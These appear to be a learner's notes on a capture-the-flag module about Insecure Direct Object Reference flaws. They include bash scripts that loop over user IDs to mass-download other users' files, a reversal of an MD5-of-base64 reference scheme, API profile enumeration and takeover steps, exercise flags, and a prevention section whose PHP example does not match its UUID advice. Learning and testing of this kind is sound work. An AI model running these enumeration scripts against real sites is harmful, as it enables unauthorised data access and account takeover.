# Insecure Direct Object Reference (IDOR)
Vulnerabilities are among the most common web Vulnerabilities and can significatly impact the vulnerable web app IDOR Vulnerabilities occur when a web app exposes a direct reference to an object.
If any user can access any resource due to the lack of a soid accecss control system, the system is considered to be vulnerable.
Building a solid access cotrol system is very challenging, which is why IDOR Vulnerabilities are prevasive, automating  the process of identifying weaknesses in access control
system is also quite difficult, which may lead to these Vulnerabilities going unidentified until they reach productions.
If users requests access top a file recently uploaded, may get a link to it such as [dowload.php?file_id=123]. As the link directly references the fle with [file_id=123], what would happen if to access another file with [dowload.php?file_id=124]
of the web app does not have a proper access control system on the back-end, wee may be able to access any file by sending a request with its file_id.

## Whats makes an IDOR Vulnerability:
Exposing a direct reference to an internal object or resource is not a Vulnerability in self. This may make it possible to exploit another Vulnerability: a week access control system. Web apps restrict users from accessing resources by resticting them fomr
accessing the pages, funtions and, APis that can reitrive these resources. What would happen if a user somehow got access to these pages. There are many ways of implementating a solid access control system for web app, like having a Role-Based Access Control[RBAC](https://en.wikipedia.org/wiki/Role-based_access_control)
system, the main takeaway is that an IDOR vulnerability mainly exists due to the lack of an access conrol on the back-end. Many developers ignore building an access control system; hence, most web apps and mobile apps are left unprotected on the back-end. All users may have
arbitrary access to all other user's on the back-end.
The only thing stopping users from accessing other user's data would be the front-end implementation of app, which is designed to only shows the user data. In such cases manually manipulation HTTP request may revela that all users have full access to all data, leading to a successful attack.

All of this makes IDOR Vulnerabilities among the most critical Vulnerabilities for any web or mobile attacks, not only due to exposing direct object references by mainly duie to a lack of a solid access control system. Even a basic access control system can be challenging to develop. A comprensive access control system covering the entire
web app without interfering with its funtions might be an even more difficult taks.

- Impact of IDOR Vulnerabilities:
The most basic ecample of a IDOR vulnerability is accesing a private files and resources of other users that should not be accessing to us, like personal file or credit date, which is known as IDOR Information Disclosure Vulnerabilities. Depending on the nature of the exposed direct references, the vulnerability may eben allow thwe modification
or deletion of other user's data, which may lead to a complete account takeover.

Once an attacker identifies the direct references, which may be a db IDs or URL parameter, they can star testing specifi patterns to see whether they can gain access to any data an may eventually understand how to extract or modify the data.
IDOR vulnerabiliiies may also lead to the elevation of user privileges from a standard user to an admin user, with IDOR insecure Funtions Calls. Many web app expose URL parameter or APIs for admin-only funtions in the front end code of the web app
and disavle these funtions for non-admin users.

## identifying IDORs:
- URL Parameter & APIs:
Very first of exploiting IDOR Vulnerabilities is identifying DIrect Object References. We receive a specific file or resources, we should study the HTTP request to look for URL parameter or APIs with an object references [?uid=1 or ?filename=file1.pdf]. These are moslty found in the url parameters or APIs but may also be found in other HTTP headers, like cookies.
In the most basic cases, we can try incrementing the values of the objct references to reitrive other data, like [uid=2] or [filename=file_2.pdf].

- AJAX CAlls:
We may also be able to identify unused parameters or APIs in the front-end code form JS AJAX calls. Some web apps developed in JS framework may insecurely place all funtions calls on the front-end  and use the appropiate ones based on teh user role.
If we did no have an admin account, onlu the user-level funtion would be used, while the admin funtions would be disable. We may still be able to find the admin funtions of we look in the front-end JS code and may be able to identify AJAX calls to specific end-points or APis that contains direct obj references.
This is not unique to admin funtions, but can also be any funtions or call that may no be found though monitoring HTTP request.
Example of AJAX Calls:
```js
funtopm changeUserPassword(){
    $.ajax({
        url:"change_password.php",
        type:"post",
        dataType:"json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:funtion(result){
            //
        }
        });
}
```
The above funtion may never be called when we use the web app as non-admin user, if we locate it in the front-end code, we may test it in diffent ways to see whehter we can call it to perform changes, which woudl undicate that it's vulnerable to IDOR.

- Understanding Hashing/Encoding:
Some web app may no use a simple sequential numbers as obj references but may encode the reference or hash it instead, if we find such parameters using encoded or hashes values, we may still be able to exploit them if there is no access control system on the back-end.
The reference was encode with a common encoder[base64], we could decode it and view the plaintext of the obj refernece, change its values, then encoode it again to access other data. If we see a refernece like [filename=ZmlsZV8xMjMucGRm] we can immediately guess that thge file name is base64 encoded which we can decode to get the original obj refernces we can  immediately guess that the file  name is
base64 encoded, we can decode to get the original obj reference of [file_123.pdf]. We can try encoding a different object refence and try  accesing it with the encoded obj reference which may reveal and IDOR vulnerability if we were able to retrive any data.
The obj reference may be hashed, like [download.php?filename=c81e728d9d4c2f636f067f89cc14862c]. We may think is a secure obj reference, as it's not using any clear text or ez encoding. If we look at the source code, we may see what is begin hashes before tha API call is made:
```js
$.ajax({
    url:"dowload.php",
    type:"post",
    dataType:"json",
    data: {filename: CyrptoJS.MD5('file_1.pdf').toString()},
    success.funtion(result){
        //
    }
});
```
We can see that code uses the filename and hashing it with CryptoJS.MD5, making it ez for us to calculate the filename for other poetential files. We may manually try to identify the hashin algorimtm begin used and then hash the filename to see if it mathces the used hash.
We can calculate for other files, we may try to downloading them which may reveal an IDOR vulnerability if we can download any files that do not belong to use.

- Comapere User Roles:
We may need to register multiple users and compare theier HTTP requests and obj references. This may us to undestand how the URL parameter and unique identifier are begin calculated and then calculated them for other users to gather their data.
If we had access to two different users, one of which can veiw their salary after making the following API call:
```js
{
  "attributes" :
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```
The second user may no have all of these API parameters to replicate the call and should not be able to make the same call as User1. API call while logged in as User2 to see if thje web app returns anything. Sich cases may work fo the web app only requieres a valid logged-in session to make the API call byut hjas no access control on teh back-end to compare the calller session with the data begin called.

## Mass IDOR Enumeration:
Exploatin IDOR vulnerability is ez in some insatace but can be challenging in other cases.. We can start testing with basic tech to see wheter if would expose any other data. As for advanced IDOR attacks, we need to better uderstand how the web app works.

- Insecure Parameters:
The exercise below ius a Employ Manager web app that host employes records; orut web are logged in as an employee with user id uid=1 to simplify things, this would require us to log in with credentials in a real web app, byt the rest of the attack woild be the same.
Click the documents.php. we see several documents that belong to our user, these can be files uploaded by our user or files set for us by another department.
```html
/documents/Invoce....pdf
/documents/Report...pdf
```
We see that the files have a predictable naming pattern, as the file name appear to be using the user uid and the month/year as part of the file name, which may allow us to fuzz file for other user.
THis is the most basic IDOR vulnerability and is called static file IDOR.
We see that the page is setting our uid with a GET parameter in the URL as document.php?uid=1 if the web app uses thius uid GET parameter as a direct reference to the employee records it should shows, we may be able to view other employees' docuemnts by simply chaging this value. IF the back-end  end of the web app does have a proper control system, we will get some form of Access Denied.\
When we try changing the uid  to ?uid=2, we dont notice any diffence in the page output.

We must be attentive to the page details during any web pentest and always keep an eye on the source code and page size.
This is a common mistake found in web applications suffering from IDOR vulnerabilities, as they place the parameter that controls which user documents to show under our control while having no access control system on the back-end.

- Mass Enumeration:
Try manually accessing other employee documents with uid=3, uid=4, and o on. Manually accessing file is not efficeint in a real work eviroment with hundreds or thousends of employees.
We can click on [CTRL+SHIFT+C] in Firefox to enable the element inspector, and then click on any of the links to view their HTML source code, and we will get the following:
```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```
We cna pick any unique word to be able to grep the link of the file. We see thgat each link starts with , so we may cuirl the page and grep for this line as:
```sh
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```
As we can see were able to capture the document links successfully, we may now use specific bash command to trim the extra parts and only get the document links in the output.
It's better practicse to use a Regex pattern that matches strings between /document and .pdf which we can use with gerp.

```sh
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```
Now we can use a simple for loop to loop over the uid parameter and return the document of all employees, and then use wget to download each document link:
```sh
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```
We run the script, it will download all documents from all employees with uids between 1-10, thus successfully exploting the IDOR vulnerability to mass enumerate the document of all employess.
Exercise code:
```sh

#!/bin/bash

base_url="http://94.237.57.57:55116"

for uid in {1..20}; do
    echo "[*] revisando uid $uid..."
    curl -s -x post -d "uid=$uid" "$base_url/documents.php" | \
    grep -op '/documents[^"]+\.txt' | while read -r txt_file; do
        echo "  [+] posible flag: $txt_file"
        full_url="$base_url$txt_file"
        echo "    - descargando y mostrando contenido:"
        curl -s "$full_url"
        echo -e "\n----------------------------------"
    done
done

[*] Revisando UID 15...
  [+] Posible flag: /documents/Invoice_15_11_2020.pdf' target='_blank'>Invoice</a></li><li class='pure-tree_link'><a href='/documents/Report_15_01_2020.pdf' target='_blank'>Report</a></li><li class='pure-tree_link'><a href='/documents/flag_11dfa168ac8eb2958e38425728623c98.txt
    - Descargando y mostrando contenido:

----------------------------------
HTB{4ll_f1l35_4r3_m1n3}
```

## Bypassing Encoded Reference:
In some cases, web apps make hashes or encode their object refenreces, making enumeration more difficult but may still be posible.
If wee click employement_contract.pdf start to download the file, we can intercept with burp. We see that is sending a POST request to download.php with the following data:
`contract=cdd96d3cc73d1dbdaffa03cc6cd7339b`
Using download.php script to download file is common practice to avoid directly linking to files, as that may bne exploitable with multiple web attack. The web app is not sending the direct reference in cleatext byt apperars to be hashing it in an md5 format.
We can attempt to hash varius values, like uid, username, files, and many othe, and see if any of their md5 hashes match the above value. Then we can replocate it for other users and collect their files.
```sh
echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b -
```
The hashes do not match, we can attempt this with varius other filds, but none of them matches our hashes. WE may also utilize [Burp Comparer ] and fuzz varius values and then compare each to our hashes to see if we find any matches. The md5 hash could be for a unique value or combination of values.
This making direct reference a Secure Direct Objeect Reference.

- Funtion Disclosure:
As modern web app are developed using JS frameworks, like Angular, React or Vau.js many web devs may makle the mistakeof performing sentive funtions on teh front-end, which
would expose them to attackers. The above hash was begin calculated on the front-end, we can study the funtions and then replicate what it's doing to calculate the same hash.
If we take a look at the link inn the source code, we see that it calling a JS funtion with javascript:dowloadContract('1'). Looking at teh downloadContract() funtion in the source code.
```js
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```
This funtion appears to be sending a POST request with the contract parameter, which is what we saw above, the value it's sending si an md5 hash using the cryptojs library, which also matches the request we saw earlier.
The value begin hashed is btoa(uid), which is the base64 encoded string of the uid variable, which is an input argument for the funtion.
The earlier link where the funtion we see is calling downloadContract('1'). The final value used in teh POST request is the base64 encoded string of 1, wich was then md5 hashed.
We can test this by base64 encoding our uid=1. and then hashing it with md5:
```sh
echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```
We are using the -n flag with echo and teh -w - flag with base64, to avoid adding new lines, un order to be avle to calculate teh md5 hash of the same value, without hashing newlines as that would change teh final md5.

This hash matches the hash in our request, meaning that we have successfully reversed the hashing techniques used on the obj references, turning then into IDOR.
We can begin enumerating other employees' contracts using the same hash methd we used above.

- Mass enumeration:
Let us write a simple bash script to retrive all employee contracts. This is the ez and most effiecient method of enumerating data and files through IDOR vulnerabilities. We may utilize tools like Burp INtruder or ZAP fuzzer.
We can start by calculating the hash for each of the first ten employeeusin the sam prev command while using [tr -d] to remove trailing - characters:
```sh
 for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
```
The right the script for download.php with contract hashs:
Exercise:
```sh
#!/bin/bash

# Base URL (replace with actual challenge URL, e.g., http://<SERVER_IP>:<PORT>)
BASE_URL="http://example.com"
OUTPUT_DIR="contracts"

# Create directory to store files
mkdir -p "$OUTPUT_DIR"

# Function to compute Base64 and MD5
compute_contract_values() {
  local uid=$1
  # Base64 of uid (e.g., '1' -> 'MQ==')
  BASE64=$(echo -n "$uid" | base64 -w 0)
  # URL-encoded Base64 (e.g., 'MQ==' -> 'MQ%3D%3D')
  URL_ENCODED_BASE64=$(echo -n "$BASE64" | sed 's/+/%2B/g;s/=/%3D/g')
  # MD5 of Base64 (e.g., 'MQ==' -> md5('MQ=='))
  MD5_BASE64=$(echo -n "$BASE64" | md5sum | cut -d' ' -f1)
  # MD5 of uid (e.g., '1' -> md5('1'))
  MD5_UID=$(echo -n "$uid" | md5sum | cut -d' ' -f1)
  echo "$BASE64" "$URL_ENCODED_BASE64" "$MD5_BASE64" "$MD5_UID"
}

# Loop through employee IDs 1 to 20
for i in {1..20}; do
  # Compute contract values
  read BASE64 URL_ENCODED_BASE64 MD5_BASE64 MD5_UID <<< $(compute_contract_values "$i")

  # Array of contract parameters to try
  CONTRACTS=(
    "$URL_ENCODED_BASE64"  # Base64-encoded UID (HTML)
    "$MD5_BASE64"         # MD5 of Base64 (reference script)
    "$MD5_UID"            # MD5 of UID
  )
  METHODS=("GET" "POST")  # Try both GET and POST

  for method in "${METHODS[@]}"; do
    for contract in "${CONTRACTS[@]}"; do
      OUTPUT_FILE="$OUTPUT_DIR/contract_${i}_${method}_${contract:0:8}.pdf"
      echo "Trying $method with contract=$contract for UID $i..."

      if [ "$method" = "GET" ]; then
        curl -s -o "$OUTPUT_FILE" "$BASE_URL/download.php?contract=$contract"
      else
        curl -s -o "$OUTPUT_FILE" -X POST -d "contract=$contract" "$BASE_URL/download.php"
      fi

      # Check if file is downloaded and not empty
      if [ -s "$OUTPUT_FILE" ]; then
        # Check file type
        FILE_TYPE=$(file "$OUTPUT_FILE")
        echo "File $OUTPUT_FILE: $FILE_TYPE"

        # If it's a text file, try cat
        if echo "$FILE_TYPE" | grep -q "text"; then
          echo "Attempting to read with cat:"
          cat "$OUTPUT_FILE"
          # Check for flag
          if cat "$OUTPUT_FILE" | grep -q "flag\|HTB"; then
            echo "Flag found in contract $i ($method, contract=$contract)!"
            exit 0
          fi
        fi

        # Try extracting strings (for PDFs or mislabeled files)
        STRINGS=$(strings "$OUTPUT_FILE")
        if echo "$STRINGS" | grep -q "flag\|HTB"; then
          echo "Possible flag found in contract $i ($method, contract=$contract):"
          echo "$STRINGS" | grep "flag\|HTB"
          exit 0
        fi
      else
        echo "Failed to download contract $i ($method, contract=$contract) or file is empty."
        rm -f "$OUTPUT_FILE"
      fi
    done
  done

  # Try direct file names (e.g., contract1.pdf, 1.pdf)
  for name in "contract$i.pdf" "$i.pdf"; do
    OUTPUT_FILE="$OUTPUT_DIR/direct_$name"
    echo "Trying direct file $name..."
    curl -s -o "$OUTPUT_FILE" "$BASE_URL/$name"

    if [ -s "$OUTPUT_FILE" ]; then
      FILE_TYPE=$(file "$OUTPUT_FILE")
      echo "File $OUTPUT_FILE: $FILE_TYPE"

      if echo "$FILE_TYPE" | grep -q "text"; then
        echo "Attempting to read with cat:"
        cat "$OUTPUT_FILE"
        if cat "$OUTPUT_FILE" | grep -q "flag\|HTB"; then
          echo "Flag found in direct file $name!"
          exit 0
        fi
      fi

      STRINGS=$(strings "$OUTPUT_FILE")
      if echo "$STRINGS" | grep -q "flag\|HTB"; then
        echo "Possible flag found in direct file $name:"
        echo "$STRINGS" | grep "flag\|HTB"
        exit 0
      fi
    else
      echo "Failed to download direct file $name or file is empty."
      rm -f "$OUTPUT_FILE"
    fi
  done
done
echo "No flag found in the contracts."

cat *.pdf | grep -aE 'HTB'

HTB{h45h1n6_1d5_w0n7_570p_m3}
```


## IDOR in Isecure APIs:
We have only been using IDOR vulnerabilities to access files and resourcess that are otu of our user access. However, IDOR vulnerabilities may also exist in fuintions call and APIs,
and exploting them would allow us to perform varius actions as other users.
While IDOR Information Disclosure Vulnerabilities allow us to read varius types of resources, IDOR Insecure Funtions Calls enable us to call APis or execute funtions as another user, such funtions nad Apis can be used to
change another user's private information, reset another user's pass, or even buy items another user's payment infromation.
We may be obtainening certain information through and information diclosure IDOR vulnerability and then using this information with IDOR insecure funtion call vulnerabilities, as we see later in this module.

- Identifying Insecure APIs:
Wehe we clikc edit profile button, we are taken to a page to edit information of our user profile, namely FUll name, email, and About me which is common featuea in many web pages.
We can change any of the details in out profile and click update profile, and we'll see that they get update and persist through refreshed, which means they get updated in a db somewhere.

We can see the pase is sending a PUT request to the /profile/api.php/profile/1 Api endpoint. Request are usually used in APIs to update item detail, while POST is used to create a new items. DELETE items, and GET ro reitreve item details.
So put request for the Update profile funtion is expected, The interesting bit is the JSON parameter it sending:
```js
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```
We see that teh PUT request includes a few hidden parameters like, uid, uuid, and most onterstingly role, which is set to employee. The web app also appears to be setting the user access privilege on the client-side, in the form of our Cookie: role=employee cookie which appears to reflect the role specified for our user.
THis is common security issues.
The access control prviilege are sent as part of the client HTTP request, either as a cookie or as part of the JSON, request leaving it under the client control, which could be manipulate.

- Exploting Insecure APIs:
Few things we could try in this case:
1. Change oru uid to another user uid, such that we can take over their account.
2. Change another user detaile, which may allow us to perform several web attacks.
3. Create new user with arbitrary details, or delete existing users.
4. Change our role to a more priviege role [admin] to be able to perform more actions.

Lest's start by changing our uid to another user's uid, any number we set other than our own uid gets us a response for uid mismatch:
The web app appears to comparing the request uid to the API endpoint(/1). This means that a form of access control on the back-end prevnets us form arbitrary changing some JSON parameters, which  might be necessary to prevent the web app form crashing or returning errors.
We cna try changing anotehr user's details. We'll change the API endpoint to /profile/api/profie/2. and change uid the new uid and send the request to the API endpoint of the new uid:
We get an error message saying Creating new employee is for admins only, the same thing happens when ewe send o delete request, as we get Deleting employees is for admins only.
The web app might be checkingh our auth through the role=employee cookie this appears to be the only form of auth in the HTTP request.
Let's try to change our role to admin/administrator to gain higer privilege. A valid role name we get invalid role in HTTP response , and our role does not update.
So all of our attempts appear to have failed, we cannot create or delete user as we cannot change our role. We cannot change our own  uid, as there are preventive measures on the back-end that we cannot control, nor can we
change another user's details for the same reason, the app secure against IDOR attacks.
We have only been testing the IDOR Insecure Funtions calls. We have not tested the API's GET request for IDOR Information Diclousure Vulnerabilities. If there was no robust access control system in place we might be able to read other user's details, which may help us with the previus
attacks we attempted.

## Chaining IDOR Vulnerabilities:
Usually a Get request to the API endpoint should return the details of teh requested user, so we may try calling to the see if we can reitrive oir user's details. We also notice that after page loads, it fetches the user details with a GET request to the same api ENdpoint.
As mentioned, the only form of authorization in out HTTP request is the role employee cookie, as the HTTP request does not cotain any other form of user-specific authorization, like JWT token for example.
- Information Disclosure:
Get request with another uid:
This returned the details of another userm with their own uuid and role, confirming an IDOR Information Disclosure Vulnerabilitiy:
This provides us with new details, most notably the uuid, which we could not calculate before, and thus could not change other user's details.
- Modifying other User's Details:
The user's uuid at hand, we can change this user's details by seding PUT request to [/profile/api.php/profile/2] whit the above details along with any modifications we made.
We don't get any access control error message this time, and when we try to GEt the user detail again, we see that we did indeed update their details:
To allowing us to view potentially sensitive details, the ability to modify another user's details alse enables us to perform several other attacks. One type of attacks is modifying a user email address and then requesting a pass reset link, which will be sent to the email address we specified, thus allowing
us to take control over their account.
Another postential attack is placeing an XSSS payload in the 'about' field, which would get executed once the user visits their Edit profile page, enabling us to attack the user in different ways.
- Changing Two IDOR Vulnerabilities:
Since we have identified an IDOR informatios Disclosure vulnerability, may also enumerate all users and look for other role, ideally and admin role. Try to write a script to enumerate all users, similary to want we did previusly.
Once we enumerate all users, we will find admin user with the following details. We may modify the admin's details and then perform one of the above attacks to take over their account.
As we know the admioin role (web_admin) we can set it to our user so we can create new users or delete current users. We will intercept the request when we intercept the request when we click on the Upload profile button and change our role to web admin.
We can refresh the page to upload our cookie, or manually set it as Cookie: role=web_admin, and intecept UPdate request to create a new user and see if we'd allowed to do so:
If we send a GET request for the new user, we see thath is has been successfully created.
Combining the information we gained from the IDOR Information Disclosure vulnerability with an IDOR Insecure Funtion Calls attack on an API endpoint, we could modify other user's details and create/delete users while bypassing varius access control checks in place. The information we leak through IDOR vulnerabilities
can be utilized in other attacks, like iDOR or XSS, leading to more sophisticated attacks or bypassing existing security mechanism.
With new role, we may also perform mass assignments to change specific fields for all users, like placing XSS payloads in their profile or changing their email we specify. Try to write a script that changes all user's wmail to email u choose.

Exercise:
```js
{"uid":"5","uuid":"eb4fe264c10eb7a528b047aa983a4829","role":"employee","full_name":"Callahan Woodhams","email":"flag@idor.htb","about":"I don't like quoting others!"}
```
```sh
#!/bin/bash

url=$1

for i in {1..20};do
  curl "$url/profile/api.php/profile/$i" >> users_info.txt
done
```

## IDOR Prevention:
We should have understood that IDOR vulnerabilitiesare mainly caused by improper access control on ther back-end servers. We first have to build an obj-level access control system and them use secure references for ur obj when storuin and callin them.
- Object-Level Access Contol:
System should be at the core of any web app since it can affect entire desing and structure. Properly control each area of the web app, its design has to supp the segmentation of role and permission in a cretralized manner. Access control is a vasto topic, so we will only focus its tole in IDOR vulnerabilities, represent in obj-level access conrol mechanims.
User role and permission are a vital part of any access control system,. which is fully realized a Role-Based Access Control (RBAC) system. To avoid explotation IDOR vulnerabilities, we must map the RBAC to all obj and resources.
The back-end server can allow or deny every request, depending on whether the request's role has enogh privilege to access the obj or the resources.

Once an RBAC has been implemented, each user would be assignmened a role that has certain privileges, every request the users makes, their roles and privileges would be tested to see if they have access to the obj they are requesting.
There are many ways to implement an RBAC system and amap ot to the web apps's obj anf resources, and designing it in teh core of the web app structure is an art to perfect.
```js
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```
The above example uses the user, token whch can be mapped from the HTTP request made to teh RBAC to retrieve the user's varius roles and prvilege. Only allows read and write access thje user's uid.

- Object Referencing:
While the core issues with IDOR lies in broken access control (Insecure), having a access to direct refences to obj DIrect Object Referencing makes it possible  to enumeratie and exploit these access conrol vulnerabilities. Even after building  solid access conrol system, should never use obj references in clear text.
We should always use strong an unique references, like saltede hashes or UUID.
Then, we can map this UUID to the object it is referencing in the back-end database, and whenever this UUID is called, the back-end database would know which object to return. The following example PHP code shows us how this may work:
```php
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result));
echo "<a href='" . $row['url'] . "' target='_blank'></a>";
```
Finally, we must note that using UUIDs may let IDOR vulnerabilities go undetected since it makes it more challenging to test for IDOR vulnerabilities. This is why strong object referencing is always the second step after implementing a strong access control system.
